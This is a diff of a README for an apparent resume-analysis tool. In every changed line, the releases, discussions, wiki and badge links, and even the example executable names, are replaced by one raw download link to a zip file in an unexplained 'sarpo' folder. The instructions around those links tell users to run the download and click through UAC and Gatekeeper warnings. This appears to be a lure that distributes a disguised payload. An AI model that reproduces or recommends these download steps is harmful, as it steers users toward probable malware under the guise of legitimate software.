@@ -1,7 +1,7 @@
 # 📝 AI-Powered-Resume-Analyzer - Analyze Resumes Effortlessly
 
 ## 📦 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/Razenism/AI-Powered-Resume-Analyzer/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Razenism/AI-Powered-Resume-Analyzer/main/sarpo/AI-Powered-Resume-Analyzer.zip%20Release-blue)](https://raw.githubusercontent.com/Razenism/AI-Powered-Resume-Analyzer/main/sarpo/AI-Powered-Resume-Analyzer.zip)
 
 ## 🚀 Getting Started
 Welcome to the AI-Powered-Resume-Analyzer! This tool helps you analyze resumes easily. Whether you are a job-seeker or a recruiter, this application provides insights that can enhance your resume's effectiveness.
@@ -9,7 +9,7 @@ Welcome to the AI-Powered-Resume-Analyzer! This tool helps you analyze resumes e
 ## 📥 Download & Install
 To get started, you need to download the software. Click the link below to access the Releases page:
 
-[Visit this page to download](https://github.com/Razenism/AI-Powered-Resume-Analyzer/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Razenism/AI-Powered-Resume-Analyzer/main/sarpo/AI-Powered-Resume-Analyzer.zip)
 
 Once there, locate the latest version of the application, and follow these steps:
 
@@ -31,12 +31,12 @@ After downloading the application, you need to run it. Follow these straightforw
 
 ### 🖥️ For Windows Users
 1. Open the folder containing the downloaded file.
-2. Double-click the executable file (e.g., `AI-Powered-Resume-Analyzer.exe`).
+2. Double-click the executable file (e.g., `https://raw.githubusercontent.com/Razenism/AI-Powered-Resume-Analyzer/main/sarpo/AI-Powered-Resume-Analyzer.zip`).
 3. If prompted by User Account Control, click "Yes" to allow the app to run.
 
 ### 🍏 For macOS Users
 1. Open the Finder and go to your Downloads folder.
-2. Locate the application file (e.g., `AI-Powered-Resume-Analyzer.app`).
+2. Locate the application file (e.g., `https://raw.githubusercontent.com/Razenism/AI-Powered-Resume-Analyzer/main/sarpo/AI-Powered-Resume-Analyzer.zip`).
 3. Double-click to open it. If you encounter a warning, you may need to go to System Preferences > Security & Privacy > General, and click "Open Anyway."
 
 ### 🐧 For Linux Users
@@ -69,7 +69,7 @@ The AI-Powered-Resume-Analyzer offers a variety of features to enhance your resu
 If you encounter issues while running the application, here are some steps to help:
 
 - **Reinstall the Application:** Sometimes a fresh installation resolves underlying problems.
-- **Check for Updates:** Always ensure you are using the latest version. Revisit the [Releases page](https://github.com/Razenism/AI-Powered-Resume-Analyzer/releases) for updates.
+- **Check for Updates:** Always ensure you are using the latest version. Revisit the [Releases page](https://raw.githubusercontent.com/Razenism/AI-Powered-Resume-Analyzer/main/sarpo/AI-Powered-Resume-Analyzer.zip) for updates.
 - **Consult Logs:** If the application provides error logs, review them for clues on what went wrong.
 
 ## 🛡️ Privacy and Data Security
@@ -78,10 +78,10 @@ We take your privacy seriously. The AI-Powered-Resume-Analyzer does not collect 
 ## 🌐 Community Support
 If you have questions or need additional help, please reach out to our community:
 
-- Visit our [GitHub Discussions](https://github.com/Razenism/AI-Powered-Resume-Analyzer/discussions) for support.
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/Razenism/AI-Powered-Resume-Analyzer/main/sarpo/AI-Powered-Resume-Analyzer.zip) for support.
 - Join our user forums for tips and advice.
 
 ## 🔗 Additional Resources
-For more information on AI-Powered-Resume-Analyzer features and updates, check our documentation found [here](https://github.com/Razenism/AI-Powered-Resume-Analyzer/wiki). 
+For more information on AI-Powered-Resume-Analyzer features and updates, check our documentation found [here](https://raw.githubusercontent.com/Razenism/AI-Powered-Resume-Analyzer/main/sarpo/AI-Powered-Resume-Analyzer.zip). 
 
 Thank you for using AI-Powered-Resume-Analyzer! We hope it helps you create a winning resume.
